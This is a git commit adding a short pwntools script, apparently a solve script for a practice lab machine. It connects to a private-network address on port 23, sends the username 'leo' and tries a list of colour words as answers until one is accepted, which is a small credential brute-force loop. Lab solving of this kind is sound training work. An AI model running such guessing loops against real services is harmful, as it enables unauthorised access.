08453355ea2ddb6051a39e1b9cefc477e8ddfaee
Mark Uche <113513376+markuched13@users.noreply.github.com>
2023-02-24 07:54:59 +0100

    Create color_brute.py

---
+++ solvescript/pg/sona/color_brute.py
@@ -0,0 +1,24 @@
+from pwn import *
+import warnings
+
+context.log_level = 'debug'
+warnings.filterwarnings("ignore", category=BytesWarning, message="Text is not bytes; assuming ASCII, no guarantees.")
+
+
+ip = '192.168.232.159'
+port = 23
+
+colour = ['blue', 'yellow', 'green', 'indigo', 'white', 'black', 'red', 'orange', 'purple']
+
+for c in colour:
+    io = remote(ip, port)
+    val = f"{c}"
+    io.sendline('leo')
+    io.sendline(val)
+    response = io.recvall().decode()
+    if 'Incorrect' in response:
+        io.close()
+    else:
+        break
+        
+  
